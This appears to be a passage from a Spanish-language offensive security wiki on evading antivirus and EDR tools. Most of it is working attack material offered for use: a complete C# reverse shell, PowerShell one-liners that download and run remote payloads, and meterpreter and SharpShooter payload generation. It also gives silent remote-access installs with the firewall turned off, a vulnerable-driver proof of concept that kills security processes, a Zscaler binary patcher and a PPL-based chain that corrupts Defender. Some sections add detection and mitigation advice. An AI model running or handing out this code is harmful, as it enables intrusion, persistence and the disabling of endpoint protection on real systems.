Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios de modo que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

Para prevenir esto, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es sencillo desplegar Chrome Remote Desktop en el PC de una víctima y usarlo para tomar control y mantener persistencia:
1. Download from https://remotedesktop.google.com/, haz clic en "Set up via SSH", y luego haz clic en el archivo MSI para Windows para descargar el MSI.
2. Ejecuta el instalador silenciosamente en la máquina víctima (se requieren privilegios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Regresa a la página de Chrome Remote Desktop y haz clic en Siguiente. El asistente te pedirá que autorices; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el PIN sin usar la GUI).

## Advanced Evasion

La evasión es un tema muy complejo; a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un mismo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno contra el que trabajes tendrá sus propias fortalezas y debilidades.

Te recomiendo ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** considera maliciosa y te la dividirá.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con una oferta web abierta del servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows 10, todas las versiones de Windows incluían un **Telnet server** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando el sistema se inicie y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar puerto de telnet** (stealth) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Configura una contraseña en _VNC Password_
- Configura una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Reverse connection**

El **attacker** debe **ejecutar en** su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para captar una reverse **VNC connection**. Luego, dentro de la **victim**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para mantener el sigilo no debes hacer algunas cosas

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primera C# reverse shell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otros tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR desde el espacio del kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en el kernel que ni siquiera los servicios AV con Protected-Process-Light (PPL) pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el driver tiene una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **kernel service** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde el espacio de usuario.
3. **IOCTLs expuestos por el driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD omite por completo las protecciones en modo usuario; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras características de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos *kernel* services y alertar cuando un driver se cargue desde un directorio escribible por todos o no esté presente en la lista de permitidos.  
•  Vigilar manejadores en modo usuario a objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Evasión de los controles de postura de Zscaler Client Connector mediante parcheo de binarios en disco

Zscaler’s **Client Connector** aplica reglas de postura del dispositivo localmente y confía en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de postura ocurre **entera del lado cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco** se pueden neutralizar ambos mecanismos:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que cada comprobación es conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso sin firmar) puede enlazarse a las pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Cortocircuitado |

Extracto mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todos** los chequeos de postura muestran **verde/conformes**.
* Los binarios sin firmar o modificados pueden abrir los named-pipe RPC endpoints (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las simples comprobaciones de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario de sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-lanza y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el invocador.
- Cuando se inicia como un proceso PPL, la escritura de archivos ocurre con respaldo PPL.
- ClipUp no puede analizar rutas que contienen espacios; use rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (por ejemplo, CreateProcessAsPPL).
2) Indique el argumento de ruta de registro de ClipUp para forzar la creación de un archivo en un directorio de AV protegido (p. ej., Defender Platform). Use rutas cortas 8.3 si es necesario.
3) Si el binario objetivo está normalmente abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo el inicio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la ubicación; la primitiva está orientada a la corrupción más que a la inyección precisa de contenido.
- Requiere administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución en el arranque evita bloqueos de archivos.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente parentados por launchers no estándar, durante el arranque.
- Nuevos servicios configurados para auto-arranque de binarios sospechosos y que consistentemente inician antes de Defender/AV. Investigar la creación/modificación de servicios previo a fallos en el inicio de Defender.
- Monitoreo de integridad de archivos en binarios de Defender/directorios Platform; creaciones/modificaciones inesperadas de archivos por procesos con flags de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios que no son AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué padres; bloquear la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios de auto-arranque y monitorear la manipulación del orden de inicio.
- Asegurar que la protección contra manipulación de Defender y las protecciones de early-launch estén habilitadas; investigar errores de inicio que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que albergan herramientas de seguridad si es compatible con tu entorno (probar exhaustivamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
